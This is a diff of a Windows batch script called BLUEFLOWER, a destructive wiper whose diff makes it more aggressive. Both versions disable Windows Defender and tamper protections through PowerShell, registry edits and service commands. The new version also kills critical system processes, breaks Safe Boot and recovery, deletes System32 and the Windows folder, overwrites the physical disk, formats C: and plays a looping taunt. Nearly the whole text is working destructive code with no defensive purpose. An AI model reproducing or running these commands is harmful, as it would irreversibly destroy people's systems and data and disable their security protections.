@@ -1,72 +1,66 @@
 @echo off
 title BLUEFLOWER
 color 4f
-mode con: cols=100 lines=35
+mode con: cols=110 lines=40
 cls
 
 echo.
-echo                  ██████╗ ██╗   ██╗███████╗
-echo                  ██╔══██╗██║   ██║██╔════╝
-echo                  ██████╔╝██║   ██║█████╗  
-echo                  ██╔══██╗██║   ██║██╔══╝  
-echo                  ██████╔╝╚██████╔╝███████╗
-echo                  ╚═════╝  ╚═════╝ ╚══════╝
+echo                     ██████╗ ██╗   ██╗███████╗███████╗
+echo                     ██╔══██╗██║   ██║██╔════╝██╔════╝
+echo                     ██████╔╝██║   ██║█████╗  █████╗  
+echo                     ██╔══██╗██║   ██║██╔══╝  ██╔══╝  
+echo                     ██████╔╝╚██████╔╝███████╗███████╗
+echo                     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
 echo.
-echo               THIS WILL RENDER YOUR DEVICE USELESS
-echo               Continue? (Y = Yes, total destruction / N = No)
-set /p choice="                                 > "
+echo                  THIS WILL INSTANTLY AND PERMANENTLY DESTROY WINDOWS
+echo                         There is no recovery. Ever.
+echo.
+set /p "choice=               Type YES in all caps to unleash OMEGA → "
 
-if /i not "%choice%"=="Y" if /i not "%choice%"=="y" goto abort
+if /i not "%choice%"=="YES" (cls & echo Aborted. BLUEFLOWER is disappointed. & timeout 5 >nul & exit)
 
-:destroy
 cls
-echo SLAUGHTERING WINDOWS SECURITY
+echo UNLEASHING OMEGA... GOODBYE
 
-powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
-powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
-powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
-powershell -ExecutionPolicy Bypass -Command "try{Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
+powershell -ep bypass -c "Set-ExecutionPolicy Unrestricted -Force" >nul 2>&1
+
+powershell -c "try{Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue}catch{}" >nul 2>&1
+powershell -c "try{Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue}catch{}" >nul 2>&1
+powershell -c "try{Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue}catch{}" >nul 2>&1
+powershell -c "try{Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue}catch{}" >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f >nul 2>&1
-sc stop WinDefend >nul 2>&1
-sc config WinDefend start= disabled >nul 2>&1
-taskkill /f /im MSMpEng.exe /im MsSense.exe /im SecurityHealthSystray.exe >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
+sc stop WinDefend >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1
 
-rd /s /q "%ProgramFiles%\Windows Defender" >nul 2>&1
-rd /s /q "%ProgramData%\Microsoft\Windows Defender" >nul 2>&1
+taskkill /f /im taskmgr.exe /im explorer.exe /im winlogon.exe /im smss.exe >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /ve /t REG_SZ /d "" /f >nul 2>&1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /ve /t REG_SZ /d "" /f >nul 2>&1
+bcdedit /set {default} recoveryenabled No >nul 2>&1
+bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v ConfigureAppInstallControl /t REG_SZ /d "Anywhere" /f >nul 2>&1
+takeown /f C:\Windows /r /d y >nul 2>&1
+icacls C:\Windows /grant Administrators:F /t /c /q >nul 2>&1
+takeown /f C:\ /r /d y >nul 2>&1
+icacls C:\ /grant Administrators:F /t /c /q >nul 2>&1
 
-taskkill /f /im taskmgr.exe >nul 2>&1
-taskkill /f /im explorer.exe >nul 2>&1
-
-echo Taking ownership...
-takeown /f C:\Windows\System32 /r /d y >nul 2>&1
-icacls C:\Windows\System32 /grant Administrators:F /t /c >nul 2>&1
-echo Deleting System32...
+:: Method 1: Classic System32 wipe
 rd /s /q C:\Windows\System32 >nul 2>&1
 rd /s /q C:\Windows\SysWOW64 >nul 2>&1
 rd /s /q C:\Windows >nul 2>&1
 
-echo Bricking bootloader...
-format \\.\PhysicalDrive0 /fs:ntfs /q /y >nul 2>&1
+powershell -c "$bytes = [byte[]] (0..255 | ForEach { $_ }) * 1000000; $stream = [IO.File]::Open('\\.\PhysicalDrive0', 'Open', 'Write'); $stream.Write($bytes,0,$bytes.Length); $stream.Close()" >nul 2>&1
 
-powershell -Command "while($true){[Console]::Beep(32767,100); $v=New-Object -ComObject Sapi.SpVoice; $v.Rate=10; $v.Speak('BLUEFLOWER HAS WON')}" >nul 2>&1
+echo y|format C: /fs:NTFS /q /v:BLUEFLOWER >nul 2>&1
+
+powershell -c "while(1){[Console]::Beep(32767,100); $v=New-Object -ComObject Sapi.SpVoice; $v.Rate=20; $v.Speak('OMEGA COMPLETE. YOUR PC IS DEAD FOREVER')}" >nul 2>&1
 
 cls
 echo.
-echo           WINDOWS SECURITY = DEAD (no errors)
-echo           SYSTEM32          = GONE
-echo           BOOTLOADER        = BRICKED
+echo                     OMEGA PROTOCOL EXECUTED
+echo                     WINDOWS = OBLITERATED
+echo                     DRIVE   = FORMATTED
+echo                     BOOT    = CORRUPTED
 echo.
-echo                 YOUR PC IS NOW ETERNAL DARKNESS
-echo                      LOVE, BLUEFLOWER 🌸
-pause >nul
-
-:abort
-echo Aborted. BLUEFLOWER will wait patiently...
-timeout /t 3 >nul
-exit
+echo                YOUR DEVICE IS NOW A $400 PAPERWEIGHT
+ping -n 999 127.0.0.1 >nul
